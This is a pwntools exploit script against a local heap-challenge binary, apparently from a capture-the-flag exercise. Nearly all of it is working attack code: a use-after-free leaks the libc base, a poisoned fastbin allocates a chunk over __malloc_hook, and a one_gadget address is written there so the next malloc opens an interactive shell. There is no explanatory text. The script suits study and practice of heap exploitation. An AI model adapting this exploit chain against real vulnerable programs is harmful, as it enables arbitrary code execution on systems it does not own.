from pwn import *
context(
	log_level='debug',
	binary='./heap_demo'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('>> ',str(func))

def add(size):
	menu(1)
	io.sendlineafter('size:',str(size))

def delete(index):
	menu(2)
	io.sendlineafter('index:',str(index))

def show(index):
	menu(3)
	io.sendlineafter('index:',str(index))

def edit(index,content):
	menu(4)
	io.sendlineafter('index:',str(index))
	io.sendafter('content:',str(content))

#=========================================
#VAR
leak_libc_off = 0x3c4b78
name = e.symbols['name']
one_gadget=[283158,283242,983716,987463]

#=========================================
add(0x80) #0
add(0x80) #1

delete(0)
show(0)
libc.address = u64(io.recvline()[:-1].ljust(8,'\x00'))-leak_libc_off
success("libc base: " + hex(libc.address))

malloc_hook=libc.symbols['__malloc_hook']
add(0x60) #2
delete(2) 

payload = p64(malloc_hook-0x23)
edit(2,payload)

add(0x60) #3
add(0x60) #4

payload='a'*0x13+p64(libc.address+one_gadget[3])

edit(4,payload)
add(111)

#dbg()

io.interactive()
